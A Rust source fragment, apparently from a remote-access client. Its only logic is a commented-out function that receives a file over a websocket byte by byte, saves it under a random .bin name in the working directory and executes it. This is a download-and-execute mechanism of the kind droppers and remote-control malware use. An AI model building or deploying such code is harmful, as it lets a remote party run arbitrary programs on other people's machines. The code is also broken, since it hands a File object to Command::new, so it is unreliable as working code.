use rand::distr::Alphanumeric;
use rand::{rng, Rng};
use std::fs::File;
use std::{
    env,
    io::{self, Write},
    process::Command,
};
use tungstenite::{connect, Message};

/*
pub fn recieve_file(message: Message, buffer: &mut Vec<u8>) {
    if message != "file_transfer_stop".into() {
        match u8::from_str_radix(&message.to_string(), 2) {
            Ok(number) => {
                buffer.push(number);
            }
            Err(e) => {
                println!("Failed to parse the binary string: {}", e);
            }
        }
    } else {
        let mut exe_dir = env::current_dir().expect("Failed to get executable directory");
        exe_dir.as_mut_os_string().push(get_random_filename());
        let mut file = File::create(exe_dir).expect("Failed to create file in specified location");

        file.write_all(buffer)
            .expect("Failed to write bytes to file");

        let output = Command::new(file)
            .output() // Execute the command and capture the output
            .expect("Failed to execute the file");
    }
}
fn get_random_filename() -> String {
    let mut s: String = rng()
        .sample_iter(&Alphanumeric)
        .take(7)
        .map(char::from)
        .collect();
    s.push_str(".bin");
    s
}
*/
